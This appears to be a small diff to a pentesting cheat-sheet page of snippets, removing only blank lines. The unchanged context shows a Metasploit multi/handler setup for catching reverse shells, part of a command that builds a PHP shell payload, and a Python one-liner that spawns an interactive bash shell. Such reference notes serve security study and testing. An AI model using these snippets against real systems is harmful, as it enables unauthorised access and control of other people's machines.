@@ -6,7 +6,6 @@ permalink: /snippets
 
 ### Metasploit
 #### Handlers
-
 ```bash 
 msf6 > use exploit/multi/handler
 msf6 > set PAYLOAD <Payload name>
@@ -26,7 +25,6 @@ lport=<your-port-address> -o shell.php
 
 
 ### Python
-
 ##### spawn a terminal 
 ```python
 $ python -c 'import pty;pty.spawn("/bin/bash")';
